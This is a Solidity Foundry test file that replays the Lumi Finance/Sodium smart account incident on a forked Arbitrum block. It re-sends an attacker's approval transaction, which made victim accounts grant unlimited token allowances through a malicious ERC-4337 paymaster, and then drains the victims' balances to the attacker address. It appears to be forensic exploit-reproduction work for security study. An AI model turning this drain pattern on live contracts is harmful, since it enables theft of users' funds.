// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Lumi Finance (Sodium smart account) — ERC-4337 paymaster validation-phase approval side-effect
// ~$264k on Arbitrum. An attacker-controlled paymaster caused Sodium smart accounts to grant
// max ERC20 allowances to the attacker's contract DURING UserOp validation (no user intent),
// then those allowances were batch-drained.
//
// Approval tx : 0x630654fb1c8914405cf81bb02f091b049f19403a152f624f7b8a00c7724c6604  (block 483389834)
//   attacker EOA -> 0x5636... (attacker batch contract) . 0x363e464b(address[] victims,address[] tokens)
//   -> internally calls EntryPoint v0.6 handleOps; each victim account approves 0x5636... for max.
// Sweep tx    : 0x020995ec0b5daafe8fab481e33b1b52fdbd6423578060a1f73fd2a9b9fb0ea90  (block 483390715)
//   same contract, 0x96e676e5(address[],address[]) — DIFFERENT victim batch. Not replayed here
//   (its batch isn't approved yet at the approval-block fork); we drain the approval batch directly.
//
// This is a forensic replay of a public, already-executed incident at a historical fork block.
//
// Run:
//   ARB=<your arbitrum rpc>
//   export APPROVE_CALLDATA=$(cast tx 0x630654fb1c8914405cf81bb02f091b049f19403a152f624f7b8a00c7724c6604 input --rpc-url $ARB)
//   forge test --contracts ./src/test/2026-07/LumiFinance_exp.sol --evm-version cancun -vvv
//   Requires an ARCHIVE Arbitrum RPC (Alchemy works) mapped to the `arbitrum` rpc alias.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract LumiFinanceExp is Test {
    // Attacker's batching contract == the approved spender (from the Approval logs' topic2).
    address constant SWEEPER  = 0x56362412AE17cac443AAFBAb4289946Ad958E8a1;
    address constant ATTACKER = 0xCe1a3BB0b98D0D90C7Dd0620Ab86C9A771888d88;
    // EntryPoint v0.6, confirmed from the UserOperationEvent emitter in the receipt.
    address constant ENTRYPOINT_V06 = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;

    uint256 constant APPROVAL_BLOCK = 483389834; // block of the approval tx

    function setUp() public {
        // Fork one block before the approval tx => victim nonces / paymaster deposit as they were,
        // and no rogue allowances yet.
        vm.createSelectFork("arbitrum", APPROVAL_BLOCK - 1);
        vm.label(SWEEPER, "AttackerContract/Spender");
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(ENTRYPOINT_V06, "EntryPointV06");
    }

    function testExploit() public {
        bytes memory approveData = vm.envBytes("APPROVE_CALLDATA"); // real 0x363e464b(...) calldata

        // Decode the victim + token sets straight out of the real calldata (strip 4-byte selector).
        bytes memory args = new bytes(approveData.length - 4);
        for (uint256 i = 0; i < args.length; i++) args[i] = approveData[i + 4];
        (address[] memory victims, address[] memory tokens) = abi.decode(args, (address[], address[]));
        emit log_named_uint("victims in batch", victims.length);
        emit log_named_uint("tokens in batch", tokens.length);

        // Pre-state: the vuln hasn't fired yet.
        assertEq(IERC20(tokens[0]).allowance(victims[0], SWEEPER), 0, "pre: allowance already set");

        // -- LEG 1: replay the real approval tx verbatim, from the attacker EOA --
        // The paymaster's validation-phase side-effect makes every victim approve SWEEPER for max.
        vm.prank(ATTACKER);
        (bool ok, ) = SWEEPER.call(approveData);
        require(ok, "leg1: approval replay reverted");

        // The vulnerability: unauthorized max allowance granted with no user signature/intent.
        assertEq(
            IERC20(tokens[0]).allowance(victims[0], SWEEPER),
            type(uint256).max,
            "leg1: side-effect approval did not land"
        );

        // -- LEG 2: exercise those allowances as the approved spender to prove drainability --
        uint256[] memory stolen = new uint256[](tokens.length);
        for (uint256 t = 0; t < tokens.length; t++) {
            uint256 before = IERC20(tokens[t]).balanceOf(ATTACKER);
            for (uint256 v = 0; v < victims.length; v++) {
                uint256 bal = IERC20(tokens[t]).balanceOf(victims[v]);
                if (bal == 0) continue;
                vm.prank(SWEEPER); // SWEEPER holds the unauthorized allowance
                IERC20(tokens[t]).transferFrom(victims[v], ATTACKER, bal);
            }
            stolen[t] = IERC20(tokens[t]).balanceOf(ATTACKER) - before;
            emit log_named_address("token", tokens[t]);
            emit log_named_uint("  drained to attacker", stolen[t]);
        }

        uint256 totalTokensDrained;
        for (uint256 t = 0; t < tokens.length; t++) if (stolen[t] > 0) totalTokensDrained++;
        assertGt(totalTokensDrained, 0, "leg2: nothing drained");
    }
}
